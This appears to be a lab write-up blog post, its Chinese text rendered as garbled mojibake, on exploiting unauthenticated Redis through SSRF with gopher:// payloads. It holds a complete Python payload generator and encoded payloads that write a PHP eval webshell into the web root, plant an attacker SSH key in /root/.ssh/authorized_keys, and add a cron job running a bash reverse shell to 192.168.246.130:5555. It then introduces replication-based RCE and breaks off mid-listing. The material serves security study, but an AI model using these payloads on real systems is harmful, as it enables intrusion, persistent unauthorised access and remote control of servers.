#è®¾ç½®æ•°æ®åº“æ–‡ä»¶åä¸ºshell.phpï¼Œè¿™é‡Œæ˜¯æŒ‡ç¤ºredisåœ¨ä¸‹ä¸€æ¬¡ä¿å­˜å…¶æ•°æ®åº“æ—¶å­˜å‚¨ä¸º webç›®å½•/shell.php config set dbfilename shell.php save\t#è¿™ä¸ªå‘½ä»¤å‘Šè¯‰Redisç«‹å³åŒæ­¥ä¿å­˜æ•°æ®åˆ°ç£ç›˜ä¸Šçš„æ•°æ®åº“æ–‡ä»¶ è¿™é‡Œçš„ç›®çš„å°±æ˜¯å‘å¯¹æ–¹æœåŠ¡å™¨çš„webç›®å½•å†™å…¥ä¸€å¥è¯æœ¨é©¬ã€‚è¿™é‡Œå¸ˆå‚…è‡ªå·±å†™äº†ä¸ªè½¬åŒ–ä¸ºredis RESPåè®®æ ¼å¼çš„è„šæœ¬ï¼Œè¿™é‡Œæˆ‘ç›´æ¥cväº†ï¼ˆæˆ‘æ˜¯å¤§å½©ç¬”~~ï¼‰ import urllib protocol=\"gopher://\" ip=\"127.0.0.1\" port=\"6379\" shell=\" &lt;?php eval($_GET[\\\"cmd\\\"]);?&gt; \" filename=\"shell.php\" path=\"/var/www/html\" passwd=\"\" cmd=[\"flushall\", \"set 1 {}\".format(shell.replace(\" \",\"${IFS}\")), \"config set dir {}\".format(path), \"config set dbfilename {}\".format(filename), \"save\" ] if passwd: cmd.insert(0,\"AUTH {}\".format(passwd)) payload=protocol+ip+\":\"+port+\"/_\" def redis_format(arr): CRLF=\"\\r \" redis_arr = arr.split(\" \") cmd=\"\" cmd+=\"*\"+str(len(redis_arr)) for x in redis_arr: cmd+=CRLF+\"$\"+str(len((x.replace(\"${IFS}\",\" \"))))+CRLF+x.replace(\"${IFS}\",\" \") cmd+=CRLF return cmd if __name__==\"__main__\": for x in cmd: payload += urllib.quote(redis_format(x)) print(payload) å¾—åˆ°çš„payloadå¦‚ä¸‹ï¼Œä¸è¿‡ä¸‹é¢åªè¿›è¡Œäº†ä¸€æ¬¡urlç¼–ç ï¼Œè€Œå¦‚æœæˆ‘ä»¬åˆ©ç”¨çš„æ˜¯ssrfçš„è¯ï¼Œä¸€èˆ¬å°±è¦ç¼–ç ä¸¤æ¬¡ gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2431%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E%0A%0A%0D% 0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A //äºŒæ¬¡ç¼–ç å gopher%3A//127.0.0.1%3A6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252431%250D%250A%250A%250A%253C%2 53Fphp%2520eval%2528%2524_GET%255B%2522cmd%2522%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250A dir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A æœ€ååœ¨ssrf.phpå‘é€ä¸Šè¿°payloadå³å¯ æœåŠ¡ç«¯çœ‹åˆ°æœ¨é©¬æˆåŠŸå†™å…¥ï¼Œä¸‹å›¾éªŒè¯æˆåŠŸ åœ¨è¿™é‡Œæ¨èä¸€ä¸ªå·¥å…·ï¼Œè™½ç„¶ä¹‹å‰çš„æ–‡ç« gopheruså·¥å…·å°±å¯ä»¥æ‰“redisï¼Œä¸è¿‡æ„Ÿè§‰è¿™ä¸ªæ›´ä¸“ä¸š gopher-redis-auth py2ç¯å¢ƒä¸‹è¿è¡Œï¼Œå¾—åˆ°çš„å†…å®¹è®°å¾—äºŒæ¬¡ç¼–ç å‘é€ ä¾æ—§æˆåŠŸå†™å…¥ å†™sshå…¬é’¥ å¦‚æœ.sshç›®å½•å­˜åœ¨ï¼Œåˆ™ç›´æ¥å†™å…¥~/.ssh/authorized_keysï¼›å¦‚æœä¸å­˜åœ¨ï¼Œåˆ™å¯ä»¥åˆ©ç”¨crontabåˆ›å»ºè¯¥ç›®å½• ä¸è¿‡éœ€è¦æ³¨æ„ï¼Œè¿™ç§æ–¹æ³•éœ€è¦ç¡®ä¿é¶æœºå…è®¸ä½¿ç”¨å¯†é’¥ç™»å½•ã€‚ å¼€å¯æ–¹æ³•ï¼šéœ€è¦ä¿®æ”¹ ssh é…ç½®æ–‡ä»¶ /etc/ssh/sshd_config #StrictModes yes æ”¹ä¸º StrictModes no ç„¶åé‡å¯sshdå³å¯ /bin/systemctl restart sshd.service æˆ‘ä»¬å…ˆç›´æ¥å°è¯•sshç™»å½•é¶æœºè¯•è¯•ï¼š å¯ä»¥çœ‹åˆ°æ˜¯éœ€è¦ç™»å½•å¯†ç çš„ï¼Œé‚£æˆ‘ä»¬å¼€å§‹æ”»å‡» ç”Ÿæˆæ”»å‡»æœºå…¬é’¥ è¿™é‡Œå‘¢æˆ‘å¯¹å…¬é’¥ç§é’¥çš„åŸç†ä»€ä¹ˆçš„å¿˜è®°äº†ï¼Œå…·ä½“åŸç†æˆ‘è®¤ä¸ºå¯ä»¥å‚è€ƒï¼šSSH çš„åŸç†ä¸åº”ç”¨ å…¶ä¸­å¯¹å’±ä»¬è¿™æ¬¡çš„æ”»å‡»æ€è·¯æœ‰å¸®åŠ©çš„æ˜¯ ä½¿ç”¨å¯†ç ç™»å½•ï¼Œæ¯æ¬¡éƒ½å¿…é¡»è¾“å…¥å¯†ç ï¼Œéå¸¸éº»çƒ¦ã€‚å¥½åœ¨SSHè¿˜æä¾›äº†å…¬é’¥ç™»å½•ï¼Œå¯ä»¥çœå»è¾“å…¥å¯†ç çš„æ­¥éª¤ã€‚ æ‰€è°“\"å…¬é’¥ç™»å½•\"ï¼ŒåŸç†å¾ˆç®€å•ï¼Œå°±æ˜¯ç”¨æˆ·å°†è‡ªå·±çš„å…¬é’¥å‚¨å­˜åœ¨è¿œç¨‹ä¸»æœºä¸Šã€‚ç™»å½•çš„æ—¶å€™ï¼Œè¿œç¨‹ä¸»æœºä¼šå‘ç”¨æˆ·å‘é€ä¸€æ®µéšæœºå­—ç¬¦ä¸²ï¼Œç”¨æˆ·ç”¨è‡ªå·±çš„ç§é’¥åŠ å¯†åï¼Œå†å‘å›æ¥ã€‚è¿œç¨‹ä¸»æœºç”¨äº‹å…ˆå‚¨å­˜çš„å…¬é’¥è¿›è¡Œè§£å¯†ï¼Œå¦‚æœæˆåŠŸï¼Œå°±è¯æ˜ç”¨æˆ·æ˜¯å¯ä¿¡çš„ï¼Œç›´æ¥å…è®¸ç™»å½•shellï¼Œä¸å†è¦æ±‚å¯†ç ã€‚ è¿™ç§æ–¹æ³•è¦æ±‚ç”¨æˆ·å¿…é¡»æä¾›è‡ªå·±çš„å…¬é’¥ã€‚å¦‚æœæ²¡æœ‰ç°æˆçš„ï¼Œå¯ä»¥ç›´æ¥ç”¨ssh-keygenç”Ÿæˆä¸€ä¸ªï¼š $ ssh-keygen è¿è¡Œä¸Šé¢çš„å‘½ä»¤ä»¥åï¼Œç³»ç»Ÿä¼šå‡ºç°ä¸€ç³»åˆ—æç¤ºï¼Œå¯ä»¥ä¸€è·¯å›è½¦ã€‚å…¶ä¸­æœ‰ä¸€ä¸ªé—®é¢˜æ˜¯ï¼Œè¦ä¸è¦å¯¹ç§é’¥è®¾ç½®å£ä»¤ï¼ˆpassphraseï¼‰ï¼Œå¦‚æœæ‹…å¿ƒç§é’¥çš„å®‰å…¨ï¼Œè¿™é‡Œå¯ä»¥è®¾ç½®ä¸€ä¸ªã€‚ è¿è¡Œç»“æŸä»¥åï¼Œåœ¨~/.ssh/ç›®å½•ä¸‹ï¼Œä¼šæ–°ç”Ÿæˆä¸¤ä¸ªæ–‡ä»¶ï¼šid_rsa.pubå’Œid_rsaã€‚å‰è€…æ˜¯å…¬é’¥ï¼Œåè€…æ˜¯ç§é’¥ã€‚ è¿™ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥æƒ³åŠæ³•å°†è‡ªå·±æ”»å‡»æœºçš„å…¬é’¥å‘é€åˆ°å¯¹æ–¹æœåŠ¡å™¨ä¸Šï¼Œè¿™æ ·æˆ‘ä»¬ä»¥åå¯¹å…¶è¯·æ±‚è¿œç¨‹è¿æ¥çš„æ—¶å€™å°±æ²¡å¿…è¦è¾“å…¥å¯†ç äº†ã€‚ ssh-keygen -t rsa è¿™é‡Œä¸€è·¯å›è½¦å³å¯ï¼Œæœ€åè¿›å…¥/root/.sshç›®å½•ä¸‹å³å¯çœ‹åˆ°å…¬é’¥å’Œç§é’¥ï¼Œå¦‚ä¸‹å›¾ï¼Œå‰è€…ä¸ºç§é’¥ï¼Œåè€…ä¸ºå…¬é’¥ ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAqM1m48h1BQnii8QA16Ebv4M2jXT5rMBO6RDYkZZzMNypV8xhD8+FZ3tPB8iivCWMCVFAAby4gH7GvL+DYQnOMQXsIbC3xrqQ+C6O/4T4VZey1e2JQ00O7+8Kl2gWuIkPyXKKTXm88LOfYcARETlr20+INfJuzcb6ui1ZF+QnBtxDoea5OMNSD86a1Wq5ECOZRKodP2f5BA/vJ0r57cly8qtVkykNcQxzzB1d9nMVx900gP5aA3N6Oxsd7ROKOPDqhvHvHij0s6KzgRPc9OyT5S7Itdz9hQyFhNYczzl4deY+PV3dzqRRCEBH8XLbaihKVSk8OA3KYoaMv3oAD1QbI98FuEzoFy6gaYJd0XAP0TBGFExgmMSUCw5t2k79C7LH2sLFbn6hGQqjErLHky7qDoVpEX0Ohv1yh4EcoAAcLeagUQwg+jmcuusQejrd8SsRmQtDWhw2qFCuoYkEaKyJBixb5KxZAFoSJJ4TeGdbRaAcTuTkVLzBgJXDCA5n2hM= root@kali æœ€åæˆ‘ä»¬ä¿®æ”¹ä¸€ä¸‹ä¸Šè¿°è„šæœ¬ import urllib protocol=\"gopher://\" ip=\"127.0.0.1\" port=\"6379\" shell=\" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAqM1m48h1BQnii8QA16Ebv4M2jXT5rMBO6RDYkZZzMNypV8xhD8+FZ3tPB8iivCWMCVFAAby4gH7GvL+DYQnOMQXsIbC3xrqQ+C6O/4T4VZey1e2JQ00O7+8Kl2gWuIkPyXKKTXm88LOfYcARETlr20+INfJuzcb6ui1ZF+QnBtxDoea5OMNSD86a1Wq5ECOZRKodP2f5BA/vJ0r57cly8qtVkykNcQxzzB1d9nMVx900gP5aA3N6Oxsd7ROKOPDqhvHvHij0s6KzgRPc9OyT5S7Itdz9hQyFhNYczzl4deY+PV3dzqRRCEBH8XLbaihKVSk8OA3KYoaMv3oAD1QbI98FuEzoFy6gaYJd0XAP0TBGFExgmMSUCw5t2k79C7LH2sLFbn6hGQqjErLHky7qDoVpEX0Ohv1yh4EcoAAcLeagUQwg+jmcuusQejrd8SsRmQtDWhw2qFCuoYkEaKyJBixb5KxZAFoSJJ4TeGdbRaAcTuTkVLzBgJXDCA5n2hM= root@kali \" filename=\"authorized_keys\" path=\"/root/.ssh/\" passwd=\"\" cmd=[\"flushall\", \"set 1 {}\".format(shell.replace(\" \",\"${IFS}\")), \"config set dir {}\".format(path), \"config set dbfilename {}\".format(filename), \"save\" ] if passwd: cmd.insert(0,\"AUTH {}\".format(passwd)) payload=protocol+ip+\":\"+port+\"/_\" def redis_format(arr): CRLF=\"\\r \" redis_arr = arr.split(\" \") cmd=\"\" cmd+=\"*\"+str(len(redis_arr)) for x in redis_arr: cmd+=CRLF+\"$\"+str(len((x.replace(\"${IFS}\",\" \"))))+CRLF+x.replace(\"${IFS}\",\" \") cmd+=CRLF return cmd if __name__==\"__main__\": for x in cmd: payload += urllib.quote(redis_format(x)) print urllib.quote(payload) //äºŒæ¬¡ç¼–ç çš„ç»“æœ gopher%3A//127.0.0.1%3A6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%2524566%250D%250A%250A%250Assh-rs a%2520AAAAB3NzaC1yc2EAAAADAQABAAABgQDAqM1m48h1BQnii8QA16Ebv4M2jXT5rMBO6RDYkZZzMNypV8xhD8%252BFZ3tPB8iivCWMCVFAAby4gH7GvL%252BDYQnOMQXsIbC3xrqQ%252BC6O/4T4VZey1e2JQ00O7%252B8Kl2gWuIkPyXK KTXm88LOfYcARETlr20%252BINfJuzcb6ui1ZF%252BQnBtxDoea5OMNSD86a1Wq5ECOZRKodP2f5BA/vJ0r57cly8qtVkykNcQxzzB1d9nMVx900gP5aA3N6Oxsd7ROKOPDqhvHvHij0s6KzgRPc9OyT5S7Itdz9hQyFhNYczzl4deY%252BPV3d zqRRCEBH8XLbaihKVSk8OA3KYoaMv3oAD1QbI98FuEzoFy6gaYJd0XAP0TBGFExgmMSUCw5t2k79C7LH2sLFbn6hGQqjErLHky7qDoVpEX0Ohv1yh4EcoAAcLeagUQwg%252BjmcuusQejrd8SsRmQtDWhw2qFCuoYkEaKyJBixb5KxZAFoSJJ4Te GdbRaAcTuTkVLzBgJXDCA5n2hM%253D%2520root%2540kali%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252411%25 0D%250A/root/.ssh/%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%252415%250D%250Aauthorized_keys%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A æˆåŠŸå†™å…¥ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬è¿œç¨‹è¿æ¥çœ‹çœ‹ æˆåŠŸå®ç°å…å¯†ç™»å½• åˆ©ç”¨contrabè®¡åˆ’ä»»åŠ¡åå¼¹shell è¿™ä¸ªæ–¹æ³•åªèƒ½Centosä¸Šä½¿ç”¨ï¼ŒUbuntuä¸Šè¡Œä¸é€šï¼ŒåŸå› å¦‚ä¸‹ï¼š å› ä¸ºé»˜è®¤rediså†™æ–‡ä»¶åæ˜¯644çš„æƒé™ï¼Œä½†ubuntuè¦æ±‚æ‰§è¡Œå®šæ—¶ä»»åŠ¡æ–‡ä»¶/var/spool/cron/crontabs/&lt;username&gt;æƒé™å¿…é¡»æ˜¯600ä¹Ÿå°±æ˜¯-rw-------æ‰ä¼šæ‰§è¡Œï¼Œå¦åˆ™ä¼šæŠ¥é”™(root) INSECURE MODE (mode 0600 expected)ï¼Œè€ŒCentosçš„å®šæ—¶ä»»åŠ¡æ–‡ä»¶/var/spool/cron/&lt;username&gt;æƒé™644ä¹Ÿèƒ½æ‰§è¡Œ å› ä¸ºredisä¿å­˜RDBä¼šå­˜åœ¨ä¹±ç ï¼Œåœ¨Ubuntuä¸Šä¼šæŠ¥é”™ï¼Œè€Œåœ¨Centosä¸Šä¸ä¼šæŠ¥é”™ ç”±äºç³»ç»Ÿçš„ä¸åŒï¼Œcrontrabå®šæ—¶æ–‡ä»¶ä½ç½®ä¹Ÿä¼šä¸åŒ Centosçš„å®šæ—¶ä»»åŠ¡æ–‡ä»¶åœ¨`/var/spool/cron/&lt;username&gt;` Ubuntuå®šæ—¶ä»»åŠ¡æ–‡ä»¶åœ¨`/var/spool/cron/crontabs/&lt;username&gt;` Centoså’ŒUbuntuå‡å­˜åœ¨çš„ï¼ˆéœ€è¦rootæƒé™ï¼‰/etc/crontab PSï¼šé«˜ç‰ˆæœ¬çš„redisé»˜è®¤å¯åŠ¨æ˜¯redisæƒé™ï¼Œæ•…å†™è¿™ä¸ªæ–‡ä»¶æ˜¯è¡Œä¸é€šçš„ æ„é€ payload è¿™é‡Œæˆ‘å†å¤ä¹ ä¸€æ³¢bashåå¼¹å‘½ä»¤çš„åŸç†å§ï¼š /bin/bash -i &gt;&amp; /dev/tcp/[ip]/[ç«¯å£] 0&gt;&amp;1 /bin/bash -i è¡¨ç¤ºçš„æ˜¯è°ƒç”¨bashå‘½ä»¤çš„äº¤äº’æ¨¡å¼ï¼Œå¹¶å°†äº¤äº’æ¨¡å¼é‡å®šå‘åˆ° /dev/tcp/[ip]/[ç«¯å£] ä¸­ã€‚è¿™é‡Œæˆ‘ä»¬å°†ipå’Œç«¯å£æ”¹ä¸ºæˆ‘ä»¬æ”»å‡»æœºçš„åœ°å€å’Œç›‘å¬ç«¯å£ã€‚ é‡å®šå‘æ—¶åŠ å…¥ä¸€ä¸ªæè¿°ç¬¦ &amp;ï¼Œè¡¨ç¤ºç›´æ¥ä½œä¸ºæ•°æ®æµè¾“å…¥ã€‚ä¸åŠ  &amp; æ—¶ï¼Œé‡å®šå‘é»˜è®¤æ˜¯è¾“å‡ºåˆ°æ–‡ä»¶é‡Œçš„ã€‚ /dev/tcp/ipåœ°å€/ç«¯å£å· æ˜¯linuxä¸‹çš„ç‰¹æ®Šæ–‡ä»¶ï¼Œè¡¨ç¤ºå¯¹è¿™ä¸ªåœ°å€ç«¯å£è¿›è¡Œtcpè¿æ¥ è¿™é‡Œæˆ‘ä»¬è®¾ç½®æˆæ”»å‡»æœºç›‘å¬çš„åœ°å€ æœ€åé¢çš„ 0&gt;&amp;1 ã€‚æ­¤æ—¶æ”»å‡»æœºå’Œé¶æœºå·²ç»å»ºç«‹å¥½äº†è¿æ¥ï¼Œå½“æ”»å‡»æœºè¿›è¡Œè¾“å…¥æ—¶ï¼Œå°±æ˜¯è¿™é‡Œçš„ 0ï¼ˆæ ‡å‡†è¾“å…¥ï¼‰ é€šè¿‡é‡å®šå‘ç¬¦ï¼Œé‡å®šå‘åˆ° 1ï¼ˆæ ‡å‡†è¾“å‡ºï¼‰ä¸­ï¼Œç”±äºæ˜¯ä½œä¸º /bin/bash çš„æ ‡å‡†è¾“å…¥ï¼Œæ‰€ä»¥å°±æ‰§è¡Œäº†ç³»ç»Ÿå‘½ä»¤äº†ã€‚ æ¥ä¸‹æ¥å¼€å§‹å†™å…¥å®šæ—¶ä»»åŠ¡ï¼Œæ„é€ redisçš„å‘½ä»¤å¦‚ä¸‹ï¼š flushall set 1 ' */1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.246.130/5555 0&gt;&amp;1 ' config set dir /var/spool/cron/ config set dbfilename root save è½¬åŒ–ä¸ºredis RESPåè®®çš„æ ¼å¼ï¼Œä¿®æ”¹ä¸Šè¿°è„šæœ¬å³å¯ import urllib protocol=\"gopher://\" ip=\"127.0.0.1\" port=\"6379\" shell=\" */1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.246.130/5555 0&gt;&amp;1 \" filename=\"root\" path=\"/var/spool/cron\" passwd=\"\" cmd=[\"flushall\", \"set 1 {}\".format(shell.replace(\" \",\"${IFS}\")), \"config set dir {}\".format(path), \"config set dbfilename {}\".format(filename), \"save\" ] if passwd: cmd.insert(0,\"AUTH {}\".format(passwd)) payload=protocol+ip+\":\"+port+\"/_\" def redis_format(arr): CRLF=\"\\r \" redis_arr = arr.split(\" \") cmd=\"\" cmd+=\"*\"+str(len(redis_arr)) for x in redis_arr: cmd+=CRLF+\"$\"+str(len((x.replace(\"${IFS}\",\" \"))))+CRLF+x.replace(\"${IFS}\",\" \") cmd+=CRLF return cmd if __name__==\"__main__\": for x in cmd: payload += urllib.quote(redis_format(x)) print urllib.quote(payload) äºŒæ¬¡ç¼–ç åçš„ç»“æœå¦‚ä¸‹ gopher%3A//127.0.0.1%3A6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252461%250D%250A%250A%250A%252A/1 %2520%252A%2520%252A%2520%252A%2520%252A%2520bash%2520-i%2520%253E%2526%2520/dev/tcp/192.168.246.130/5555%25200%253E%25261%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D %250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252415%250D%250A/var/spool/cron%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25244%250D%250Aroot%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A å‘é€åï¼Œçœ‹ä¸€ä¸‹é¶æœºæ˜¯å¦è¢«æˆåŠŸå†™å…¥ æ¥ç€æ”»å‡»æœºå¼€å¯ç›‘å¬ï¼Œç­‰ä¸€ä¼šå„¿å³å¯ã€‚å¦‚ä¸‹å›¾æˆåŠŸæ‹¿åˆ°shell ä¸è¿‡è¿™é‡Œä¹Ÿå¯ä»¥ç”¨æˆ‘æ¨èè¿‡çš„å·¥å…· ä»–è¿™é‡Œé»˜è®¤ç›‘å¬ç«¯å£ä¸º1234ï¼Œéœ€è¦æ³¨æ„ä¸€ä¸‹ï¼ŒåŒæ ·äºŒæ¬¡ç¼–ç åçœ‹é¶æœºï¼Œå¦‚ä¸‹å›¾æˆåŠŸå†™å…¥ æˆåŠŸé‚£shellï¼Œä¸è¿‡è¿™é‡Œè¿™ä¸ªå·¥å…·æ˜¯shåå¼¹ï¼Œæš‚æ—¶ä¹Ÿä¸çŸ¥é“è¿™ä¸¤ç§æ–¹å¼æœ‰ä½•åŒºåˆ« 0x05 Redisä¸»ä»å¤åˆ¶RCE è¿™é‡Œæç€æç€å°±åˆ°äº†ä¸»ä»å¤åˆ¶äº†ï¼Œå›æƒ³èµ·ä¹‹å‰æè¿™ç©æ„å„¿å¼„å¾—å¿ƒçƒ¦ï¼Œç¯å¢ƒä¸€ç›´æä¸å¥½ï¼Œçœ‹æ¥æ˜¯æ—¶å€™è§£å†³äº†~~ ä»‹ç» redis 4.x/5.x RCEæ˜¯ç”±LC/BCæˆ˜é˜Ÿé˜Ÿå‘˜Pavel Toporkovåœ¨zeronights 2018ä¸Šæå‡ºçš„åŸºäºä¸»ä»å¤åˆ¶çš„redis rceï¼Œæ¼”è®²çš„PPTåœ°å€ä¸ºï¼šPPT åˆ©ç”¨æ¡ä»¶ â–¡ èƒ½æœªæˆæƒæˆ–è€…èƒ½é€šè¿‡å¼±å£ä»¤è®¤è¯è®¿é—®åˆ°RedisæœåŠ¡å™¨ â–¡ å¯åŠ¨æ€ä¿®æ”¹å¤‡ä»½æ–‡ä»¶è·¯å¾„ â–¡ ä¸»ä»æœªæ ¡éªŒå¯ä¿¡æœåŠ¡ç«¯ ä¸»ä»å¤åˆ¶æ¦‚å¿µ ä¸»ä»å¤åˆ¶ï¼Œæ˜¯æŒ‡å°†ä¸€å°RedisæœåŠ¡å™¨çš„æ•°æ®ï¼Œå¤åˆ¶åˆ°å…¶ä»–çš„RedisæœåŠ¡å™¨ã€‚å‰è€…ç§°ä¸ºä¸»èŠ‚ç‚¹(master)ï¼Œåè€…ç§°ä¸ºä»èŠ‚ç‚¹(slave)ï¼›æ•°æ®çš„å¤åˆ¶æ˜¯å•å‘çš„ï¼Œåªèƒ½ç”±ä¸»èŠ‚ç‚¹åˆ°ä»èŠ‚ç‚¹ã€‚ redisçš„æŒä¹…åŒ–ä½¿å¾—æœºå™¨å³ä½¿é‡å¯æ•°æ®ä¹Ÿä¸ä¼šä¸¢å¤±ï¼Œå› ä¸ºredisæœåŠ¡å™¨é‡å¯åä¼šæŠŠç¡¬ç›˜ä¸Šçš„æ–‡ä»¶é‡æ–°æ¢å¤åˆ°å†…å­˜ä¸­ï¼Œä½†æ˜¯å¦‚æœç¡¬ç›˜çš„æ•°æ®è¢«åˆ é™¤çš„è¯æ•°æ®å°±æ— æ³•æ¢å¤äº†ï¼Œå¦‚æœé€šè¿‡ä¸»ä»å¤åˆ¶å°±èƒ½è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œä¸»redisçš„æ•°æ®å’Œä»redisä¸Šçš„æ•°æ®ä¿æŒå®æ—¶åŒæ­¥ï¼Œå½“ä¸»rediså†™å…¥æ•°æ®æ—¶å°±ä¼šé€šè¿‡ä¸»ä»å¤åˆ¶å¤åˆ¶åˆ°å…¶å®ƒä»redisã€‚ è¿™é‡Œå°±è·Ÿç€å¸ˆå‚…æ­å»ºä¸»ä»å¤åˆ¶äº†ï¼Œå±å®æ˜¯ä¸æ‡‚å”‰ å»ºç«‹ä¸»ä»å¤åˆ¶ï¼Œæœ‰3ç§æ–¹å¼ï¼š é…ç½®æ–‡ä»¶å†™å…¥slaveof &lt;master_ip&gt; &lt;master_port&gt; redis-serverå¯åŠ¨å‘½ä»¤ååŠ å…¥ --slaveof &lt;master_ip&gt; &lt;master_port&gt; è¿æ¥åˆ°å®¢æˆ·ç«¯ä¹‹åæ‰§è¡Œï¼šslaveof &lt;master_ip&gt; &lt;master_port&gt; PSï¼šå»ºç«‹ä¸»ä»å…³ç³»åªéœ€è¦åœ¨ä»èŠ‚ç‚¹æ“ä½œå°±è¡Œäº†ï¼Œä¸»èŠ‚ç‚¹ä¸ç”¨ä»»ä½•æ“ä½œ æˆ‘ä»¬å…ˆåœ¨åŒä¸€ä¸ªæœºå™¨å¼€ä¸¤ä¸ªrediså®ä¾‹ï¼Œä¸€ä¸ªç«¯å£ä¸º6379ï¼Œä¸€ä¸ªç«¯å£ä¸º6380 è¿™é‡Œæˆ‘ä»¬åœ¨ä¸Šé¢æ­å»ºçš„åŸºç¡€ä¸Šï¼ŒåŒä¸€ç›®å½•ä¸‹æ–°å»ºredis6380æ–‡ä»¶ï¼Œæ¥ç€å°†ä¹‹å‰å·²ç»æœ‰çš„redisç›®å½•ä¸‹çš„redis.confé…ç½®æ–‡ä»¶èµ‹å€¼åˆ°redis6380æ–‡ä»¶ä¸­ï¼Œæ¥ç€ä¿®æ”¹å…¶ä¸­ç«¯å£ä¸º6380å³å¯ å¯å‚è€ƒï¼šCentos7æ­å»ºå¤šä¸ªRediså®ä¾‹ redis-server /etc/redis/redis.conf redis-server /etc/redis/redis6380.conf #è¿™é‡Œéœ€è¦åœ¨redis-serveræœåŠ¡æ‰€åœ¨ç›®å½•ä¸‹å¯åŠ¨ï¼Œè€Œåé¢çš„å†…å®¹ä¸ºredisé…ç½®æ–‡ä»¶è·¯å¾„ å¯ä»¥çœ‹åˆ°å‡å¯åŠ¨æˆåŠŸ æˆ‘ä»¬æŠŠmaster_ipè®¾ç½®ä¸º127.0.0.1ï¼Œmaster_portä¸º6380 --è¿™é‡Œè¿™ä¸ªå¸ˆå‚…æ˜¯å°†6380æ‰€åœ¨redisæœåŠ¡å™¨å½“åšä¸»æœåŠ¡å™¨äº† å¯ä»¥çœ‹åˆ°åœ¨æˆåŠŸè®¾ç½®ä¸»ä»å…³ç³»ä¹‹åï¼Œæˆ‘ä»¬åœ¨6380ä¸»æœåŠ¡å™¨ä¸Šè®¾ç½®æŸäº›æ•°æ®ï¼Œä¹‹ååœ¨6379ä¸Šå¯ä»¥çœ‹åˆ°æ•°æ®çš„åŒæ­¥ å¦‚æœæˆ‘ä»¬æƒ³è§£é™¤ä¸»ä»å…³ç³»å¯ä»¥æ‰§è¡ŒSLAVEOF NO ONE redis module è‡ªä»Redis4.xä¹‹åredisæ–°å¢äº†ä¸€ä¸ªæ¨¡å—åŠŸèƒ½ï¼ŒRedisæ¨¡å—å¯ä»¥ä½¿ç”¨å¤–éƒ¨æ¨¡å—æ‰©å±•RedisåŠŸèƒ½ï¼Œä»¥ä¸€å®šçš„é€Ÿåº¦å®ç°æ–°çš„Rediså‘½ä»¤ï¼Œå¹¶å…·æœ‰ç±»ä¼¼äºæ ¸å¿ƒå†…éƒ¨å¯ä»¥å®Œæˆçš„åŠŸèƒ½ã€‚ Redisæ¨¡å—æ˜¯åŠ¨æ€åº“ï¼Œå¯ä»¥åœ¨å¯åŠ¨æ—¶æˆ–ä½¿ç”¨MODULE LOADå‘½ä»¤åŠ è½½åˆ°Redisä¸­ã€‚ æ¶æ„soæ–‡ä»¶ç¼–å†™ï¼šhttps://github.com/n0b0dyCN/redis-rogue-server/tree/master/RedisModulesSDK æ”»å‡»åŸç† åˆ©ç”¨æ­¥éª¤ï¼Œè´´ä¸€ä¸‹PPTä¸Šçš„æ­¥éª¤ slaveå’Œmasterçš„æ¡æ‰‹åè®®è¿‡ç¨‹ å›¾ä¸­ä¸€äº›å¸¸é‡è¯´æ˜ #define REPL_STATE_CONNECTING 2 /* ç­‰å¾…å’Œmasterè¿æ¥ */ /* --- æ¡æ‰‹çŠ¶æ€å¼€å§‹ --- */ #define REPL_STATE_RECEIVE_PONG 3 /* ç­‰å¾…PINGè¿”å› */ #define REPL_STATE_SEND_AUTH 4 /* å‘é€è®¤è¯æ¶ˆæ¯ */ #define REPL_STATE_RECEIVE_AUTH 5 /* ç­‰å¾…è®¤è¯å›å¤ */ #define REPL_STATE_SEND_PORT 6 /* å‘é€REPLCONFä¿¡æ¯ï¼Œä¸»è¦æ˜¯å½“å‰å®ä¾‹ç›‘å¬ç«¯å£ */ #define REPL_STATE_RECEIVE_PORT 7 /* ç­‰å¾…REPLCONFè¿”å› */ #define REPL_STATE_SEND_CAPA 8 /* å‘é€REPLCONF capa */ #define REPL_STATE_RECEIVE_CAPA 9 /* 